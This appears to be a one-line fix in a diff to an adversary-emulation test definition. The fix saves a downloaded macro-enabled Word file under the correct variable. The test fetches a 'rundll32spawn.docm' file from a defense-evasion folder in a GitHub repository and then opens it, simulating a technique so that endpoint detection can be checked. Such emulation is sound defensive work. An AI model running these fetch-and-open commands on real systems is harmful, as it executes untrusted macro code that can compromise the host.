@@ -18,7 +18,7 @@ atomic_tests:
       prereq_command: |
         if(Test-Path "#{macro_file}") {exit 0} else {exit 1}
       get_prereq_command: |
-        Invoke-WebRequest "https://github.com/Inovasys-CS/EDI/raw/main/defense_evasion/rundll32_suspicious_dll/bin/rundll32spawn.docm" -OutFile "#{dll_file}"
+        Invoke-WebRequest "https://github.com/Inovasys-CS/EDI/raw/main/defense_evasion/rundll32_suspicious_dll/bin/rundll32spawn.docm" -OutFile "#{macro_file}"
   executor:
     command: |
       start #{macro_file}
